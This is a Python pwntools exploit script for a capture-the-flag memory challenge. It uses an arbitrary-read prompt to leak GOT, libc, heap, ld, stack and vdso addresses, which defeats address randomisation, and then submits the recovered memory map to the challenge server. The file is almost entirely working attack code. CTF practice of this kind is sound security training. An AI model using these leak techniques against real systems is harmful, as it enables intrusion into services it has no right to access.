#! /usr/bin/python
from pwn import *
import Crypto.Util.number as cun

context.update(
        arch="amd64",
        endian="little",
        #log_level="debug",
        log_level="info",
        os="linux",
        terminal=["alacritty", "-e"]
)

to = 0.5
ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to) 
sl = lambda p,a: p.sendline(a)
up = lambda b: int.from_bytes(b, byteorder="little")

SERVICE = "challs.pwnoh.io"
PORT = 13375

def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        set follow-fork-mode parent
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote(SERVICE,PORT)
    else:
        return process(binary)

def get_leak(p,e,target):
    #sleep(2)
    try: 
        ru(p,b"Where to captain?")
        sl(p,str(target))
        ru(p,b"Good choice! We gathered ")
        leak = int(rl(p).split(b" ")[0])
        log.info(f"Leaked {hex(leak)} at {hex(target)}")
        return leak
    except:
        return 0
        pass


def answer(p,e,answer):
     
    sleep(2)
    log.info(f"Answering {hex(answer)}")
    ru(p,f"Where in the world is")
    sl(p,str(answer))
    sleep(2)



def exploit(p,e,l,ld):

 
    # Leak got entry for puts
    got_puts = get_leak(p,e,e.got["puts"])
    l.address = got_puts - 0x80e50
    log.info(f"Leaked libc address {hex(l.address)}")

    # main_arena+96 
    heap_leak = get_leak(p,e,l.address + 0x21ace0) - 0x3a0
    log.info(f"Leaked heap adddress {hex(heap_leak)}")

    # Leak ld from libc got _dl_audit_preinit@GLIBC_PRIVATE
    ld.address = get_leak(p,e,l.address + 0x21a1b8) - 0x1b660
    log.info(f"Leaked ld {hex(ld.address)}")
     
    # Leak stack from __libc_environ
    stack_leak = get_leak(p,e,l.sym["__libc_argv"])

    vdso_ptr = get_leak(p,e,ld.address+0x3b890)
    log.info(f"Leaked vdso ptr {hex(vdso_ptr)}")
    
    libc_argv = get_leak(p,e,stack_leak)


    # Find base stack
    stack_size = 21000 
    stack_addr = libc_argv 
    for i in range(0,21000,8):
        #addr = stack_leak + i 
        addr = (libc_argv & 0xfffffffffffffff8) + i
        leak = get_leak(p,e,addr)
        leak = cun.long_to_bytes(leak)
        print(leak)

        val = b"llahc/."

        if args.REMOTE:
            val = b"nur/ppa"
        else:
            val = b"llahc/."

        print(f"Val {val} Leak {leak} at {hex(addr)}")
        if (leak == val):
            stack_addr = addr             
            log.info(f"found chall at {hex(addr)}")
            break

    start_stack = (stack_addr - 0x21000 + 0x10) & 0xfffffffffffff000
    #start_stack = (stack_addr - 21000 + 0x10) 

    #vvar_addr = (stack_addr + 0x9000) & 0xfffffffffffff000
    vvar_addr = vdso_ptr - 0x4000

    log.info(f"Leaked beggining of stack {hex(start_stack)}")

    sl(p,str(0))

    ru(p,b"Back home? Hopefully the king will be pleased...")


    sleep(6)
    ru(p,b"While I am impressed with these riches.. you still must prove you sailed the world.")

    # Base
    if args.REMOTE:
        answer(p,e,4194304)
    else:
        answer(p,e,e.address)

    answer(p,e,heap_leak)
    answer(p,e,l.address)
    answer(p,e,ld.address)
    answer(p,e,start_stack)
    answer(p,e,vvar_addr)
    answer(p,e,vdso_ptr)
    answer(p,e,0xffffffffff600000)

    p.interactive()
    

if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    l = ELF("./libc.so.6")
    ld = ELF("./ld-2.35.so")


    exploit(p,e,l,ld)
